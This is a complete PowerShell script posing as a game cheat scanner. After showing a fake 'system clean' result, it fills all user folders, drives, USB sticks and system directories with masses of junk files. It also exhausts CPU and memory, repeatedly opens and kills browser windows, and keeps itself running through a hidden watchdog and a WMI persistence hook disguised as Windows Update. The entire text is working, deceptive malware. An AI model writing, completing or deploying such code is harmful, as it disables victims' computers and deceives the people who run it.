# ================================
# MAIN2PACKET TWEAKS SCANNER v10.0 - ULTIMATE FIX
# ================================

# Administrator-Rechte anfordern
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process PowerShell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit
}

# ===== TARNUNG =====
Clear-Host
Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║     MAIN2PACKET TWEAKS SCANNER v10.0      ║" -ForegroundColor Cyan
Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""
Write-Host "[INFO] Scanning for cheats and mods..."
Write-Host "[INFO] Please wait..."
Write-Host ""

# Scanner-Animation
$scanItems = @(
    "minecraft", "discord", "steam", "chrome", "firefox", 
    "system32", "registry", "memory", "processes", "network",
    "desktop", "documents", "downloads", "music", "pictures", "videos"
)

foreach ($item in $scanItems) {
    Write-Host "   scanning $item..." -NoNewline
    Start-Sleep -Milliseconds 100
    Write-Host " [OK]" -ForegroundColor Green
}
Write-Host ""
Write-Host "[RESULT] No cheats found - System clean" -ForegroundColor Green
Write-Host ""
Start-Sleep -Seconds 1

# Fenster im Hintergrund (nicht ganz verstecken)
$Host.UI.RawUI.WindowTitle = "Windows Update Scanner"

# ===== ERROR HANDLING =====
$ErrorActionPreference = "SilentlyContinue"

# ===== KONFIGURATION =====
$global:currentRound = 0
$global:maxRounds = 150

# ===== ALLE ZIELE - JETZT WIRKLICH ALLES! =====
Write-Host "[INFO] Sammle ALLE Ziele..." -ForegroundColor Yellow

$alleZiele = @()

# 1. ALLE BENUTZERORDNER (JEDER BENUTZER!)
$users = Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue
foreach ($user in $users) {
    if ($user.Name -notin @('Public', 'Default', 'All Users')) {
        $alleZiele += "$($user.FullName)\Desktop"
        $alleZiele += "$($user.FullName)\Documents"
        $alleZiele += "$($user.FullName)\Downloads"
        $alleZiele += "$($user.FullName)\Pictures"
        $alleZiele += "$($user.FullName)\Music"
        $alleZiele += "$($user.FullName)\Videos"
        $alleZiele += "$($user.FullName)\AppData\Local"
        $alleZiele += "$($user.FullName)\AppData\Roaming"
        $alleZiele += "$($user.FullName)\AppData\Local\Temp"
        $alleZiele += "$($user.FullName)\Favorites"
        $alleZiele += "$($user.FullName)\Links"
        $alleZiele += "$($user.FullName)\Contacts"
        $alleZiele += "$($user.FullName)\Saved Games"
        $alleZiele += "$($user.FullName)\Searches"
    }
}

# 2. ALLE LAUFWERKE (C:, D:, E:, usw.)
$drives = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -match "^[A-Z]:\\"}
foreach ($drive in $drives) {
    $alleZiele += $drive.Root
    # Auch Unterordner auf jedem Laufwerk
    $alleZiele += "$($drive.Root)Temp"
    $alleZiele += "$($drive.Root)ProgramData"
    $alleZiele += "$($drive.Root)Backup"
}

# 3. SYSTEM ORDNER
$alleZiele += "C:\Windows\Temp"
$alleZiele += "C:\Windows\System32\Tasks"
$alleZiele += "C:\ProgramData"
$alleZiele += "C:\ProgramData\Microsoft\Windows\Caches"
$alleZiele += "C:\ProgramData\Microsoft\Windows\WER"
$alleZiele += "C:\Program Files"
$alleZiele += "C:\Program Files (x86)"
$alleZiele += "C:\Users\Public"
$alleZiele += "C:\Users\Public\Desktop"
$alleZiele += "C:\Users\Public\Documents"
$alleZiele += "C:\Users\Public\Downloads"
$alleZiele += "C:\Users\Public\Music"
$alleZiele += "C:\Users\Public\Pictures"
$alleZiele += "C:\Users\Public\Videos"

# 4. ALLE VORHANDENEN ORDNER VOM ALTEN SKRIPT
$desktop = [Environment]::GetFolderPath("Desktop")
$documents = [Environment]::GetFolderPath("MyDocuments")
$downloads = [Environment]::GetFolderPath("UserProfiles") + "\Downloads"
$music = [Environment]::GetFolderPath("MyMusic")
$pictures = [Environment]::GetFolderPath("MyPictures")
$videos = [Environment]::GetFolderPath("MyVideos")
$appData = $env:APPDATA
$localAppData = $env:LOCALAPPDATA
$temp = $env:TEMP

$alleZiele += $desktop, $documents, $downloads, $music, $pictures, $videos
$alleZiele += $appData, $localAppData, $temp
$alleZiele += "$appData\Microsoft\Windows\Recent"
$alleZiele += "$appData\Microsoft\Windows\Templates"
$alleZiele += "$localAppData\Microsoft\Windows\Caches"
$alleZiele += "$localAppData\Microsoft\Windows\History"
$alleZiele += "$localAppData\Microsoft\Windows\INetCache"
$alleZiele += "$localAppData\Google\Chrome\User Data\Default\Cache"
$alleZiele += "$localAppData\Google\Chrome\User Data\Default\Code Cache"
$alleZiele += "$appData\Mozilla\Firefox\Profiles"
$alleZiele += "$appData\.minecraft"
$alleZiele += "$appData\Roaming\Discord"
$alleZiele += "$appData\Roaming\Discord\Cache"
$alleZiele += "$appData\Roaming\Spotify"
$alleZiele += "$appData\Roaming\Spotify\Cache"
$alleZiele += "$appData\Roaming\Steam"
$alleZiele += "$appData\Roaming\Steam\cache"

# 5. EXTRA ORDNER (NOCH MEHR!)
for ($i = 1; $i -le 50; $i++) {
    $alleZiele += "C:\TEMP_$i"
    $alleZiele += "C:\ProgramData\TEMP_$i"
    $alleZiele += "$env:TEMP\EXTRA_$i"
}

# Duplikate entfernen
$alleZiele = $alleZiele | Where-Object {$_ -ne $null} | Select-Object -Unique

Write-Host "[INFO] $($alleZiele.Count) Ziele gefunden!" -ForegroundColor Green
Write-Host ""

# ===== WATCHDOG (VEREINFACHT) =====
$watchdogScript = @"
while(`$true) {
    `$p = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne $pid}
    if (`$p.Count -eq 0) {
        Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
    }
    Start-Sleep -Seconds 10
}
"@
$watchdogScript | Out-File "$env:TEMP\watchdog.ps1" -Encoding UTF8 -Force
Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\watchdog.ps1`""

# ===== USB JOB =====
$usbJob = Start-Job -ScriptBlock {
    while ($true) {
        $drives = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -match "^[A-Z]:\\" -and $_.Root -ne "C:\"}
        foreach ($drive in $drives) {
            $drivePath = $drive.Root
            $mainUSB = Join-Path $drivePath "MAIN2PACKET_USB"
            try {
                New-Item -Path $mainUSB -ItemType Directory -Force | Out-Null
                for ($u = 1; $u -le 1000; $u++) {
                    $usbFile = Join-Path $mainUSB "usb_$u.txt"
                    "MAIN2PACKET USB SPAM" * 1000 | Out-File $usbFile -Encoding UTF8 -Force
                }
            } catch {}
        }
        Start-Sleep -Seconds 10
    }
}

# ===== BROWSER JOB =====
$browserJob = Start-Job -ScriptBlock {
    $seite = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"  # Rick Roll
    
    while ($true) {
        $wartezeit = Get-Random -Minimum 30 -Maximum 60
        Start-Sleep -Seconds $wartezeit
        
        try {
            Start-Process "msedge.exe" -ArgumentList "--new-window $seite" -ErrorAction SilentlyContinue
        } catch {
            try {
                Start-Process "chrome.exe" -ArgumentList "--new-window $seite" -ErrorAction SilentlyContinue
            } catch {}
        }
        
        Start-Sleep -Seconds 20
        Get-Process | Where-Object {$_.Name -like "*edge*" -or $_.Name -like "*chrome*"} | Stop-Process -Force
    }
}

# ===== CPU + RAM FRESSEN =====
for ($cpu = 1; $cpu -le 20; $cpu++) {
    Start-Job -ScriptBlock {
        while ($true) {
            $a = 0
            for ($i = 0; $i -lt 1000000; $i++) {
                $a += [Math]::Sqrt($i) * [Math]::Sin($i)
            }
        }
    }
}

for ($ram = 1; $ram -le 10; $ram++) {
    Start-Job -ScriptBlock {
        $data = @()
        while ($true) {
            $data += New-Object byte[] (50MB)
            Start-Sleep -Milliseconds 500
        }
    }
}

# ===== HAUPTSCHLEIFE - ALLES GLEICHZEITIG =====
Write-Host "[INFO] STARTE ZERSTÖRUNG - $($alleZiele.Count) ZIELE GLEICHZEITIG!" -ForegroundColor Red
Write-Host ""

# ALLE ZIELE AUFTEILEN FÜR PARALLELE VERARBEITUNG
$zielGruppen = @()
$gruppe = @()
$counter = 0

foreach ($ziel in $alleZiele) {
    $gruppe += $ziel
    $counter++
    if ($counter -ge 20) {
        $zielGruppen += ,@($gruppe)
        $gruppe = @()
        $counter = 0
    }
}
if ($gruppe.Count -gt 0) {
    $zielGruppen += ,@($gruppe)
}

Write-Host "[INFO] $($zielGruppen.Count) parallele Gruppen" -ForegroundColor Yellow

# HAUPTLOOP
while ($global:currentRound -lt $global:maxRounds) {
    $global:currentRound++
    Write-Host "[RUNDE $global:currentRound/$global:maxRounds] FRESSE PC..." -ForegroundColor Red
    
    # ALLE GRUPPEN PARALLEL STARTEN
    $jobs = @()
    $gruppenIndex = 0
    
    foreach ($gruppe in $zielGruppen) {
        $gruppenIndex++
        $jobs += Start-Job -Name "Gruppe$gruppenIndex" -ScriptBlock {
            $ziele = $args[0]
            $runde = $args[1]
            $computer = $args[2]
            
            foreach ($ziel in $ziele) {
                # Ziel erstellen falls nicht vorhanden
                if (-not (Test-Path $ziel)) {
                    try { New-Item -Path $ziel -ItemType Directory -Force | Out-Null } catch {}
                }
                
                if (Test-Path $ziel) {
                    # Hauptordner für diese Runde
                    $mainFolder = Join-Path $ziel "MAIN2PACKET_$runde"
                    try { New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null } catch {}
                    
                    # 1000 DATEIEN direkt im Ziel
                    for ($i = 1; $i -le 1000; $i++) {
                        $f1 = Join-Path $ziel "FILE_${runde}_$i.txt"
                        $f2 = Join-Path $mainFolder "file_$i.txt"
                        "$computer - RUNDE $runde - $i" * 100 | Out-File $f1 -Encoding UTF8 -Force
                        "$computer - RUNDE $runde - $i" * 100 | Out-File $f2 -Encoding UTF8 -Force
                    }
                    
                    # 500 UNTERORDNER
                    for ($u = 1; $u -le 500; $u++) {
                        $subFolder = Join-Path $mainFolder "SUB_$u"
                        try { New-Item -Path $subFolder -ItemType Directory -Force | Out-Null } catch {}
                        
                        # 500 DATEIEN pro Unterordner
                        for ($s = 1; $s -le 500; $s++) {
                            $sf = Join-Path $subFolder "sub_$s.txt"
                            "SUB $u - DATEI $s - RUNDE $runde" * 10 | Out-File $sf -Encoding UTF8 -Force
                        }
                    }
                    
                    # Zusätzlich: 100 GROSSE Dateien
                    for ($g = 1; $g -le 100; $g++) {
                        $gf = Join-Path $mainFolder "BIG_$g.bin"
                        # 1MB pro Datei
                        $bytes = New-Object byte[] (1MB)
                        [System.IO.File]::WriteAllBytes($gf, $bytes)
                    }
                }
            }
        } -ArgumentList $gruppe, $global:currentRound, $env:COMPUTERNAME
    }
    
    # Auf Jobs warten (maximal 30 Sekunden)
    $jobs | Wait-Job -Timeout 30 | Out-Null
    
    # Jobs die noch laufen im Hintergrund lassen
    Write-Host "[RUNDE $global:currentRound] $($jobs | Where-Object {$_.State -eq 'Running'} | Measure-Object | Select-Object -ExpandProperty Count) Jobs noch aktiv" -ForegroundColor Yellow
    
    Start-Sleep -Milliseconds 500
}

# ===== WMI PERSISTENZ =====
try {
    $filterArgs = @{
        Name = 'WindowsUpdateFilter'
        EventNameSpace = 'root\cimv2'
        QueryLanguage = 'WQL'
        Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
    }
    $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs -ErrorAction SilentlyContinue
    
    $consumerArgs = @{
        Name = 'WindowsUpdateConsumer'
        CommandLineTemplate = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    }
    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs -ErrorAction SilentlyContinue
    
    $bindingArgs = @{Filter=$filter; Consumer=$consumer}
    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $bindingArgs -ErrorAction SilentlyContinue
} catch {}

# ===== ENDLOS =====
while ($true) {
    Write-Host "[PC FRESSER] LÄUFT WEITER..." -ForegroundColor Red
    Start-Sleep -Seconds 60
}
